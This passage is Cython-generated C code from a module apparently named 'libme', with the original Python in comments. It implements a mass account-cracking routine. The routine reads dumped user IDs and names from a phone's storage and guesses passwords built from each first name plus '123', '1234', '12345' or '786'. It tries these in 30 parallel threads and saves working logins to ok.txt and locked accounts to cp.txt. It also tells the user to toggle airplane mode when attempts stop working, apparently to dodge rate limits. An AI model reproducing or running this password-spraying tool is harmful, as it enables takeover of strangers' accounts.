 * 					print("\n  \033[0;97m[] Ok result saved in > ok.txt")             # <<<<<<<<<<<<<<
 * 					print("  [] Cp result saved in > cp.txt")
 * 					print("  [!] if no result turn on airplane mode 5 seconds\n")
 */
            if (__Pyx_PrintOne(0, __pyx_kp_s_0_97m_Ok_result_saved_in_ok_txt) < 0) __PYX_ERR(0, 460, __pyx_L37_error)

            /* "libme.pyx":461
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:
 * 					print("\n  \033[0;97m[] Ok result saved in > ok.txt")
 * 					print("  [] Cp result saved in > cp.txt")             # <<<<<<<<<<<<<<
 * 					print("  [!] if no result turn on airplane mode 5 seconds\n")
 * 					for user in self.id:
 */
            if (__Pyx_PrintOne(0, __pyx_kp_s_Cp_result_saved_in_cp_txt) < 0) __PYX_ERR(0, 461, __pyx_L37_error)

            /* "libme.pyx":462
 * 					print("\n  \033[0;97m[] Ok result saved in > ok.txt")
 * 					print("  [] Cp result saved in > cp.txt")
 * 					print("  [!] if no result turn on airplane mode 5 seconds\n")             # <<<<<<<<<<<<<<
 * 					for user in self.id:
 * 						uid, name = user.split("|")
 */
            if (__Pyx_PrintOne(0, __pyx_kp_s_if_no_result_turn_on_airplane_m) < 0) __PYX_ERR(0, 462, __pyx_L37_error)

            /* "libme.pyx":463
 * 					print("  [] Cp result saved in > cp.txt")
 * 					print("  [!] if no result turn on airplane mode 5 seconds\n")
 * 					for user in self.id:             # <<<<<<<<<<<<<<
 * 						uid, name = user.split("|")
 * 						ft = name.split(" ")[0]
 */
            __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_id); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 463, __pyx_L37_error)
            __Pyx_GOTREF(__pyx_t_10);
            if (likely(PyList_CheckExact(__pyx_t_10)) || PyTuple_CheckExact(__pyx_t_10)) {
              __pyx_t_5 = __pyx_t_10; __Pyx_INCREF(__pyx_t_5); __pyx_t_7 = 0;
              __pyx_t_8 = NULL;
            } else {
              __pyx_t_7 = -1; __pyx_t_5 = PyObject_GetIter(__pyx_t_10); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 463, __pyx_L37_error)
              __Pyx_GOTREF(__pyx_t_5);
              __pyx_t_8 = Py_TYPE(__pyx_t_5)->tp_iternext; if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 463, __pyx_L37_error)
            }
            __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
            for (;;) {
              if (likely(!__pyx_t_8)) {
                if (likely(PyList_CheckExact(__pyx_t_5))) {
                  if (__pyx_t_7 >= PyList_GET_SIZE(__pyx_t_5)) break;
                  #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                  __pyx_t_10 = PyList_GET_ITEM(__pyx_t_5, __pyx_t_7); __Pyx_INCREF(__pyx_t_10); __pyx_t_7++; if (unlikely(0 < 0)) __PYX_ERR(0, 463, __pyx_L37_error)
                  #else
                  __pyx_t_10 = PySequence_ITEM(__pyx_t_5, __pyx_t_7); __pyx_t_7++; if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 463, __pyx_L37_error)
                  __Pyx_GOTREF(__pyx_t_10);
                  #endif
                } else {
                  if (__pyx_t_7 >= PyTuple_GET_SIZE(__pyx_t_5)) break;
                  #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                  __pyx_t_10 = PyTuple_GET_ITEM(__pyx_t_5, __pyx_t_7); __Pyx_INCREF(__pyx_t_10); __pyx_t_7++; if (unlikely(0 < 0)) __PYX_ERR(0, 463, __pyx_L37_error)
                  #else
                  __pyx_t_10 = PySequence_ITEM(__pyx_t_5, __pyx_t_7); __pyx_t_7++; if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 463, __pyx_L37_error)
                  __Pyx_GOTREF(__pyx_t_10);
                  #endif
                }
              } else {
                __pyx_t_10 = __pyx_t_8(__pyx_t_5);
                if (unlikely(!__pyx_t_10)) {
                  PyObject* exc_type = PyErr_Occurred();
                  if (exc_type) {
                    if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();
                    else __PYX_ERR(0, 463, __pyx_L37_error)
                  }
                  break;
                }
                __Pyx_GOTREF(__pyx_t_10);
              }
              __Pyx_XDECREF_SET(__pyx_v_user, __pyx_t_10);
              __pyx_t_10 = 0;

              /* "libme.pyx":464
 * 					print("  [!] if no result turn on airplane mode 5 seconds\n")
 * 					for user in self.id:
 * 						uid, name = user.split("|")             # <<<<<<<<<<<<<<
 * 						ft = name.split(" ")[0]
 * 						if len(ft)>=6:
 */
              __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_v_user, __pyx_n_s_split); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 464, __pyx_L37_error)
              __Pyx_GOTREF(__pyx_t_6);
              __pyx_t_17 = NULL;
              if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_6))) {
                __pyx_t_17 = PyMethod_GET_SELF(__pyx_t_6);
                if (likely(__pyx_t_17)) {
                  PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
                  __Pyx_INCREF(__pyx_t_17);
                  __Pyx_INCREF(function);
                  __Pyx_DECREF_SET(__pyx_t_6, function);
                }
              }
              __pyx_t_10 = (__pyx_t_17) ? __Pyx_PyObject_Call2Args(__pyx_t_6, __pyx_t_17, __pyx_kp_s__38) : __Pyx_PyObject_CallOneArg(__pyx_t_6, __pyx_kp_s__38);
              __Pyx_XDECREF(__pyx_t_17); __pyx_t_17 = 0;
              if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 464, __pyx_L37_error)
              __Pyx_GOTREF(__pyx_t_10);
              __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
              if ((likely(PyTuple_CheckExact(__pyx_t_10))) || (PyList_CheckExact(__pyx_t_10))) {
                PyObject* sequence = __pyx_t_10;
                Py_ssize_t size = __Pyx_PySequence_SIZE(sequence);
                if (unlikely(size != 2)) {
                  if (size > 2) __Pyx_RaiseTooManyValuesError(2);
                  else if (size >= 0) __Pyx_RaiseNeedMoreValuesError(size);
                  __PYX_ERR(0, 464, __pyx_L37_error)
                }
                #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                if (likely(PyTuple_CheckExact(sequence))) {
                  __pyx_t_6 = PyTuple_GET_ITEM(sequence, 0); 
                  __pyx_t_17 = PyTuple_GET_ITEM(sequence, 1); 
                } else {
                  __pyx_t_6 = PyList_GET_ITEM(sequence, 0); 
                  __pyx_t_17 = PyList_GET_ITEM(sequence, 1); 
                }
                __Pyx_INCREF(__pyx_t_6);
                __Pyx_INCREF(__pyx_t_17);
                #else
                __pyx_t_6 = PySequence_ITEM(sequence, 0); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 464, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_6);
                __pyx_t_17 = PySequence_ITEM(sequence, 1); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 464, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_17);
                #endif
                __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
              } else {
                Py_ssize_t index = -1;
                __pyx_t_9 = PyObject_GetIter(__pyx_t_10); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 464, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_9);
                __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
                __pyx_t_15 = Py_TYPE(__pyx_t_9)->tp_iternext;
                index = 0; __pyx_t_6 = __pyx_t_15(__pyx_t_9); if (unlikely(!__pyx_t_6)) goto __pyx_L45_unpacking_failed;
                __Pyx_GOTREF(__pyx_t_6);
                index = 1; __pyx_t_17 = __pyx_t_15(__pyx_t_9); if (unlikely(!__pyx_t_17)) goto __pyx_L45_unpacking_failed;
                __Pyx_GOTREF(__pyx_t_17);
                if (__Pyx_IternextUnpackEndCheck(__pyx_t_15(__pyx_t_9), 2) < 0) __PYX_ERR(0, 464, __pyx_L37_error)
                __pyx_t_15 = NULL;
                __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
                goto __pyx_L46_unpacking_done;
                __pyx_L45_unpacking_failed:;
                __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
                __pyx_t_15 = NULL;
                if (__Pyx_IterFinish() == 0) __Pyx_RaiseNeedMoreValuesError(index);
                __PYX_ERR(0, 464, __pyx_L37_error)
                __pyx_L46_unpacking_done:;
              }
              __Pyx_XDECREF_SET(__pyx_v_uid, __pyx_t_6);
              __pyx_t_6 = 0;
              __Pyx_XDECREF_SET(__pyx_v_name, __pyx_t_17);
              __pyx_t_17 = 0;

              /* "libme.pyx":465
 * 					for user in self.id:
 * 						uid, name = user.split("|")
 * 						ft = name.split(" ")[0]             # <<<<<<<<<<<<<<
 * 						if len(ft)>=6:
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 */
              __pyx_t_17 = __Pyx_PyObject_GetAttrStr(__pyx_v_name, __pyx_n_s_split); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 465, __pyx_L37_error)
              __Pyx_GOTREF(__pyx_t_17);
              __pyx_t_6 = NULL;
              if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_17))) {
                __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_17);
                if (likely(__pyx_t_6)) {
                  PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_17);
                  __Pyx_INCREF(__pyx_t_6);
                  __Pyx_INCREF(function);
                  __Pyx_DECREF_SET(__pyx_t_17, function);
                }
              }
              __pyx_t_10 = (__pyx_t_6) ? __Pyx_PyObject_Call2Args(__pyx_t_17, __pyx_t_6, __pyx_kp_s__43) : __Pyx_PyObject_CallOneArg(__pyx_t_17, __pyx_kp_s__43);
              __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
              if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 465, __pyx_L37_error)
              __Pyx_GOTREF(__pyx_t_10);
              __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
              __pyx_t_17 = __Pyx_GetItemInt(__pyx_t_10, 0, long, 1, __Pyx_PyInt_From_long, 0, 0, 1); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 465, __pyx_L37_error)
              __Pyx_GOTREF(__pyx_t_17);
              __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
              __Pyx_XDECREF_SET(__pyx_v_ft, __pyx_t_17);
              __pyx_t_17 = 0;

              /* "libme.pyx":466
 * 						uid, name = user.split("|")
 * 						ft = name.split(" ")[0]
 * 						if len(ft)>=6:             # <<<<<<<<<<<<<<
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 * 						elif len(ft) == 3 or len(ft) == 4 or len(ft) == 5:
 */
              __pyx_t_20 = PyObject_Length(__pyx_v_ft); if (unlikely(__pyx_t_20 == ((Py_ssize_t)-1))) __PYX_ERR(0, 466, __pyx_L37_error)
              __pyx_t_19 = ((__pyx_t_20 >= 6) != 0);
              if (__pyx_t_19) {

                /* "libme.pyx":467
 * 						ft = name.split(" ")[0]
 * 						if len(ft)>=6:
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]             # <<<<<<<<<<<<<<
 * 						elif len(ft) == 3 or len(ft) == 4 or len(ft) == 5:
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 */
                __pyx_t_17 = PyNumber_Add(__pyx_v_ft, __pyx_kp_s_123); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 467, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_17);
                __pyx_t_10 = PyNumber_Add(__pyx_v_ft, __pyx_kp_s_1234); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 467, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_10);
                __pyx_t_6 = PyNumber_Add(__pyx_v_ft, __pyx_kp_s_12345); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 467, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_6);
                __pyx_t_9 = PyNumber_Add(__pyx_v_ft, __pyx_kp_s_786); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 467, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_9);
                __pyx_t_4 = PyList_New(5); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 467, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_4);
                __Pyx_INCREF(__pyx_v_name);
                __Pyx_GIVEREF(__pyx_v_name);
                PyList_SET_ITEM(__pyx_t_4, 0, __pyx_v_name);
                __Pyx_GIVEREF(__pyx_t_17);
                PyList_SET_ITEM(__pyx_t_4, 1, __pyx_t_17);
                __Pyx_GIVEREF(__pyx_t_10);
                PyList_SET_ITEM(__pyx_t_4, 2, __pyx_t_10);
                __Pyx_GIVEREF(__pyx_t_6);
                PyList_SET_ITEM(__pyx_t_4, 3, __pyx_t_6);
                __Pyx_GIVEREF(__pyx_t_9);
                PyList_SET_ITEM(__pyx_t_4, 4, __pyx_t_9);
                __pyx_t_17 = 0;
                __pyx_t_10 = 0;
                __pyx_t_6 = 0;
                __pyx_t_9 = 0;
                __Pyx_XDECREF_SET(__pyx_v_pwx, ((PyObject*)__pyx_t_4));
                __pyx_t_4 = 0;

                /* "libme.pyx":466
 * 						uid, name = user.split("|")
 * 						ft = name.split(" ")[0]
 * 						if len(ft)>=6:             # <<<<<<<<<<<<<<
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 * 						elif len(ft) == 3 or len(ft) == 4 or len(ft) == 5:
 */
                goto __pyx_L47;
              }

              /* "libme.pyx":468
 * 						if len(ft)>=6:
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 * 						elif len(ft) == 3 or len(ft) == 4 or len(ft) == 5:             # <<<<<<<<<<<<<<
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 * 						else:
 */
              __pyx_t_20 = PyObject_Length(__pyx_v_ft); if (unlikely(__pyx_t_20 == ((Py_ssize_t)-1))) __PYX_ERR(0, 468, __pyx_L37_error)
              __pyx_t_13 = ((__pyx_t_20 == 3) != 0);
              if (!__pyx_t_13) {
              } else {
                __pyx_t_19 = __pyx_t_13;
                goto __pyx_L48_bool_binop_done;
              }
              __pyx_t_20 = PyObject_Length(__pyx_v_ft); if (unlikely(__pyx_t_20 == ((Py_ssize_t)-1))) __PYX_ERR(0, 468, __pyx_L37_error)
              __pyx_t_13 = ((__pyx_t_20 == 4) != 0);
              if (!__pyx_t_13) {
              } else {
                __pyx_t_19 = __pyx_t_13;
                goto __pyx_L48_bool_binop_done;
              }
              __pyx_t_20 = PyObject_Length(__pyx_v_ft); if (unlikely(__pyx_t_20 == ((Py_ssize_t)-1))) __PYX_ERR(0, 468, __pyx_L37_error)
              __pyx_t_13 = ((__pyx_t_20 == 5) != 0);
              __pyx_t_19 = __pyx_t_13;
              __pyx_L48_bool_binop_done:;
              if (__pyx_t_19) {

                /* "libme.pyx":469
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 * 						elif len(ft) == 3 or len(ft) == 4 or len(ft) == 5:
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]             # <<<<<<<<<<<<<<
 * 						else:
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 */
                __pyx_t_4 = PyNumber_Add(__pyx_v_ft, __pyx_kp_s_123); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 469, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_4);
                __pyx_t_9 = PyNumber_Add(__pyx_v_ft, __pyx_kp_s_1234); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 469, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_9);
                __pyx_t_6 = PyNumber_Add(__pyx_v_ft, __pyx_kp_s_12345); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 469, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_6);
                __pyx_t_10 = PyNumber_Add(__pyx_v_ft, __pyx_kp_s_786); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 469, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_10);
                __pyx_t_17 = PyList_New(5); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 469, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_17);
                __Pyx_INCREF(__pyx_v_name);
                __Pyx_GIVEREF(__pyx_v_name);
                PyList_SET_ITEM(__pyx_t_17, 0, __pyx_v_name);
                __Pyx_GIVEREF(__pyx_t_4);
                PyList_SET_ITEM(__pyx_t_17, 1, __pyx_t_4);
                __Pyx_GIVEREF(__pyx_t_9);
                PyList_SET_ITEM(__pyx_t_17, 2, __pyx_t_9);
                __Pyx_GIVEREF(__pyx_t_6);
                PyList_SET_ITEM(__pyx_t_17, 3, __pyx_t_6);
                __Pyx_GIVEREF(__pyx_t_10);
                PyList_SET_ITEM(__pyx_t_17, 4, __pyx_t_10);
                __pyx_t_4 = 0;
                __pyx_t_9 = 0;
                __pyx_t_6 = 0;
                __pyx_t_10 = 0;
                __Pyx_XDECREF_SET(__pyx_v_pwx, ((PyObject*)__pyx_t_17));
                __pyx_t_17 = 0;

                /* "libme.pyx":468
 * 						if len(ft)>=6:
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 * 						elif len(ft) == 3 or len(ft) == 4 or len(ft) == 5:             # <<<<<<<<<<<<<<
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 * 						else:
 */
                goto __pyx_L47;
              }

              /* "libme.pyx":471
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 * 						else:
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]             # <<<<<<<<<<<<<<
 * 						coeg.submit(self.__bapi__, uid, pwx)
 * 	def __masal2__(self):
 */
              /*else*/ {
                __pyx_t_17 = PyNumber_Add(__pyx_v_ft, __pyx_kp_s_123); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 471, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_17);
                __pyx_t_10 = PyNumber_Add(__pyx_v_ft, __pyx_kp_s_1234); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 471, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_10);
                __pyx_t_6 = PyNumber_Add(__pyx_v_ft, __pyx_kp_s_12345); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 471, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_6);
                __pyx_t_9 = PyNumber_Add(__pyx_v_ft, __pyx_kp_s_786); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 471, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_9);
                __pyx_t_4 = PyList_New(5); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 471, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_4);
                __Pyx_INCREF(__pyx_v_name);
                __Pyx_GIVEREF(__pyx_v_name);
                PyList_SET_ITEM(__pyx_t_4, 0, __pyx_v_name);
                __Pyx_GIVEREF(__pyx_t_17);
                PyList_SET_ITEM(__pyx_t_4, 1, __pyx_t_17);
                __Pyx_GIVEREF(__pyx_t_10);
                PyList_SET_ITEM(__pyx_t_4, 2, __pyx_t_10);
                __Pyx_GIVEREF(__pyx_t_6);
                PyList_SET_ITEM(__pyx_t_4, 3, __pyx_t_6);
                __Pyx_GIVEREF(__pyx_t_9);
                PyList_SET_ITEM(__pyx_t_4, 4, __pyx_t_9);
                __pyx_t_17 = 0;
                __pyx_t_10 = 0;
                __pyx_t_6 = 0;
                __pyx_t_9 = 0;
                __Pyx_XDECREF_SET(__pyx_v_pwx, ((PyObject*)__pyx_t_4));
                __pyx_t_4 = 0;
              }
              __pyx_L47:;

              /* "libme.pyx":472
 * 						else:
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 * 						coeg.submit(self.__bapi__, uid, pwx)             # <<<<<<<<<<<<<<
 * 	def __masal2__(self):
 * 		try:
 */
              __pyx_t_9 = __Pyx_PyObject_GetAttrStr(__pyx_v_coeg, __pyx_n_s_submit); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 472, __pyx_L37_error)
              __Pyx_GOTREF(__pyx_t_9);
              __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_bapi); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 472, __pyx_L37_error)
              __Pyx_GOTREF(__pyx_t_6);
              __pyx_t_10 = NULL;
              __pyx_t_12 = 0;
              if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_9))) {
                __pyx_t_10 = PyMethod_GET_SELF(__pyx_t_9);
                if (likely(__pyx_t_10)) {
                  PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_9);
                  __Pyx_INCREF(__pyx_t_10);
                  __Pyx_INCREF(function);
                  __Pyx_DECREF_SET(__pyx_t_9, function);
                  __pyx_t_12 = 1;
                }
              }
              #if CYTHON_FAST_PYCALL
              if (PyFunction_Check(__pyx_t_9)) {
                PyObject *__pyx_temp[4] = {__pyx_t_10, __pyx_t_6, __pyx_v_uid, __pyx_v_pwx};
                __pyx_t_4 = __Pyx_PyFunction_FastCall(__pyx_t_9, __pyx_temp+1-__pyx_t_12, 3+__pyx_t_12); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 472, __pyx_L37_error)
                __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
                __Pyx_GOTREF(__pyx_t_4);
                __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
              } else
              #endif
              #if CYTHON_FAST_PYCCALL
              if (__Pyx_PyFastCFunction_Check(__pyx_t_9)) {
                PyObject *__pyx_temp[4] = {__pyx_t_10, __pyx_t_6, __pyx_v_uid, __pyx_v_pwx};
                __pyx_t_4 = __Pyx_PyCFunction_FastCall(__pyx_t_9, __pyx_temp+1-__pyx_t_12, 3+__pyx_t_12); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 472, __pyx_L37_error)
                __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
                __Pyx_GOTREF(__pyx_t_4);
                __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
              } else
              #endif
              {
                __pyx_t_17 = PyTuple_New(3+__pyx_t_12); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 472, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_17);
                if (__pyx_t_10) {
                  __Pyx_GIVEREF(__pyx_t_10); PyTuple_SET_ITEM(__pyx_t_17, 0, __pyx_t_10); __pyx_t_10 = NULL;
                }
                __Pyx_GIVEREF(__pyx_t_6);
                PyTuple_SET_ITEM(__pyx_t_17, 0+__pyx_t_12, __pyx_t_6);
                __Pyx_INCREF(__pyx_v_uid);
                __Pyx_GIVEREF(__pyx_v_uid);
                PyTuple_SET_ITEM(__pyx_t_17, 1+__pyx_t_12, __pyx_v_uid);
                __Pyx_INCREF(__pyx_v_pwx);
                __Pyx_GIVEREF(__pyx_v_pwx);
                PyTuple_SET_ITEM(__pyx_t_17, 2+__pyx_t_12, __pyx_v_pwx);
                __pyx_t_6 = 0;
                __pyx_t_4 = __Pyx_PyObject_Call(__pyx_t_9, __pyx_t_17, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 472, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_4);
                __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
              }
              __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
              __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

              /* "libme.pyx":463
 * 					print("  [] Cp result saved in > cp.txt")
 * 					print("  [!] if no result turn on airplane mode 5 seconds\n")
 * 					for user in self.id:             # <<<<<<<<<<<<<<
 * 						uid, name = user.split("|")
 * 						ft = name.split(" ")[0]
 */
            }
            __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

            /* "libme.pyx":459
 * 					coeg.submit(self.__bapi__,uid, listpass.split(","))
 * 		elif ask == "t":
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:             # <<<<<<<<<<<<<<
 * 					print("\n  \033[0;97m[] Ok result saved in > ok.txt")
 * 					print("  [] Cp result saved in > cp.txt")
 */
          }
          __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;
          __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
          __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
          goto __pyx_L42_try_end;
          __pyx_L37_error:;
          __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
          __Pyx_XDECREF(__pyx_t_16); __pyx_t_16 = 0;
          __Pyx_XDECREF(__pyx_t_17); __pyx_t_17 = 0;
          __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
          __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
          __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
          __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
          /*except:*/ {
            __Pyx_AddTraceback("libme.James.__1000__", __pyx_clineno, __pyx_lineno, __pyx_filename);
            if (__Pyx_GetException(&__pyx_t_5, &__pyx_t_4, &__pyx_t_9) < 0) __PYX_ERR(0, 459, __pyx_L39_except_error)
            __Pyx_GOTREF(__pyx_t_5);
            __Pyx_GOTREF(__pyx_t_4);
            __Pyx_GOTREF(__pyx_t_9);
            __pyx_t_17 = PyTuple_Pack(3, __pyx_t_5, __pyx_t_4, __pyx_t_9); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 459, __pyx_L39_except_error)
            __Pyx_GOTREF(__pyx_t_17);
            __pyx_t_18 = __Pyx_PyObject_Call(__pyx_t_3, __pyx_t_17, NULL);
            __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
            __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
            if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 459, __pyx_L39_except_error)
            __Pyx_GOTREF(__pyx_t_18);
            __pyx_t_19 = __Pyx_PyObject_IsTrue(__pyx_t_18);
            __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
            if (__pyx_t_19 < 0) __PYX_ERR(0, 459, __pyx_L39_except_error)
            __pyx_t_13 = ((!(__pyx_t_19 != 0)) != 0);
            if (__pyx_t_13) {
              __Pyx_GIVEREF(__pyx_t_5);
              __Pyx_GIVEREF(__pyx_t_4);
              __Pyx_XGIVEREF(__pyx_t_9);
              __Pyx_ErrRestoreWithState(__pyx_t_5, __pyx_t_4, __pyx_t_9);
              __pyx_t_5 = 0; __pyx_t_4 = 0; __pyx_t_9 = 0; 
              __PYX_ERR(0, 459, __pyx_L39_except_error)
            }
            __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
            __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
            __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
            goto __pyx_L38_exception_handled;
          }
          __pyx_L39_except_error:;
          __Pyx_XGIVEREF(__pyx_t_14);
          __Pyx_XGIVEREF(__pyx_t_1);
          __Pyx_XGIVEREF(__pyx_t_2);
          __Pyx_ExceptionReset(__pyx_t_14, __pyx_t_1, __pyx_t_2);
          goto __pyx_L1_error;
          __pyx_L38_exception_handled:;
          __Pyx_XGIVEREF(__pyx_t_14);
          __Pyx_XGIVEREF(__pyx_t_1);
          __Pyx_XGIVEREF(__pyx_t_2);
          __Pyx_ExceptionReset(__pyx_t_14, __pyx_t_1, __pyx_t_2);
          __pyx_L42_try_end:;
        }
      }
      /*finally:*/ {
        /*normal exit:*/{
          if (__pyx_t_3) {
            __pyx_t_2 = __Pyx_PyObject_Call(__pyx_t_3, __pyx_tuple__13, NULL);
            __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
            if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 459, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_2);
            __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
          }
          goto __pyx_L36;
        }
        __pyx_L36:;
      }
      goto __pyx_L54;
      __pyx_L33_error:;
      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
      goto __pyx_L1_error;
      __pyx_L54:;
    }

    /* "libme.pyx":458
 * 					uid, name = user.split("|")
 * 					coeg.submit(self.__bapi__,uid, listpass.split(","))
 * 		elif ask == "t":             # <<<<<<<<<<<<<<
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:
 * 					print("\n  \033[0;97m[] Ok result saved in > ok.txt")
 */
  }
  __pyx_L13:;

  /* "libme.pyx":436
 * 		print("  \033[0;97m[] Total id > \033[0;92m%s\033[0;97m"%(len(__id)))
 * 		print("  [] Extra Dump File saved in > %s"%(__file))
 * 	def __1000__(self):             # <<<<<<<<<<<<<<
 * 		try:
 * 			file = '/storage/emulated/0/1000.txt'
 */

  /* function exit code */
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_4);
  __Pyx_XDECREF(__pyx_t_5);
  __Pyx_XDECREF(__pyx_t_6);
  __Pyx_XDECREF(__pyx_t_9);
  __Pyx_XDECREF(__pyx_t_10);
  __Pyx_XDECREF(__pyx_t_16);
  __Pyx_XDECREF(__pyx_t_17);
